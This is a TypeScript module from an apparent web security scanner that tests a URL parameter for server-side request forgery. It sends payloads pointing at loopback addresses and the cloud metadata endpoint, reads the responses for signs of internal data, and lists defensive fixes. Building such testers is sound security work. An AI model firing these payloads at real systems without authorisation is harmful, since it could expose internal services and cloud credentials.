import { performance } from 'node:perf_hooks';
import { logToolActivity } from '../utils/activityLogger.js';

export interface SSRFResult {
  url: string;
  parameter: string;
  vulnerable: boolean;
  successfulPayloads: string[];
  internalResponseDetected: boolean;
  recommendations: string[];
  scanDuration: number;
}

const SSRF_PAYLOADS = [
  'http://127.0.0.1/',
  'http://localhost/',
  'http://169.254.169.254/latest/meta-data/',
  'http://[::1]/',
  'http://0.0.0.0/',
  'http://2130706433/',
];

const INTERNAL_SIGNATURES = [
  /169\.254\.169\.254/,
  /ami-id/,
  /instance-id/,
  /local-ipv4/,
  /computeMetadata/,
  /\b10\.\d+\.\d+\.\d+\b/,
  /\b192\.168\.\d+\.\d+\b/,
  /\b172\.\d+\.\d+\.\d+\b/,
];

export async function performSSRFTest(
  url: string,
  parameter: string,
  timeoutMs: number = 10000
): Promise<SSRFResult> {
  const start = performance.now();

  logToolActivity('SSRF Tester', `Testing SSRF on ${url} param=${parameter}`, 'info');

  const successfulPayloads: string[] = [];
  let internalResponseDetected = false;

  // Get baseline response
  let baselineLength = 0;
  try {
    const baseResp = await fetch(url, { signal: AbortSignal.timeout(5000) });
    const baseText = await baseResp.text();
    baselineLength = baseText.length;
  } catch {
    // Baseline failed, continue anyway
  }

  for (const payload of SSRF_PAYLOADS) {
    try {
      const testUrl = new URL(url);
      testUrl.searchParams.set(parameter, payload);

      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), Math.min(timeoutMs / SSRF_PAYLOADS.length, 4000));

      try {
        const response = await fetch(testUrl.toString(), {
          signal: controller.signal,
          redirect: 'follow',
        });
        clearTimeout(timeout);

        if (response.ok || response.status === 200) {
          const text = await response.text().catch(() => '');

          // Check for internal response signatures
          const isInternal = INTERNAL_SIGNATURES.some((re) => re.test(text));
          if (isInternal) {
            internalResponseDetected = true;
            successfulPayloads.push(payload);
          } else if (Math.abs(text.length - baselineLength) > 100) {
            // Significant response length difference may indicate SSRF
            successfulPayloads.push(payload + ' (response variation)');
          }
        }
      } finally {
        clearTimeout(timeout);
      }
    } catch {
      // Skip failed payloads
    }
  }

  const vulnerable = successfulPayloads.length > 0 || internalResponseDetected;

  const recommendations = [
    'Validate and sanitize all URL inputs',
    'Use an allowlist of permitted domains/IPs',
    'Block requests to private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x)',
    'Disable unnecessary URL schemes (file://, gopher://, dict://)',
    'Implement network egress filtering on the server',
    'Use a dedicated HTTP client with SSRF protection (e.g. ssrf-filter)',
  ];

  logToolActivity('SSRF Tester', `SSRF test complete: ${vulnerable ? 'VULNERABLE' : 'not detected'}`, vulnerable ? 'warning' : 'success');

  return {
    url,
    parameter,
    vulnerable,
    successfulPayloads,
    internalResponseDetected,
    recommendations,
    scanDuration: Math.round((performance.now() - start) / 1000),
  };
}
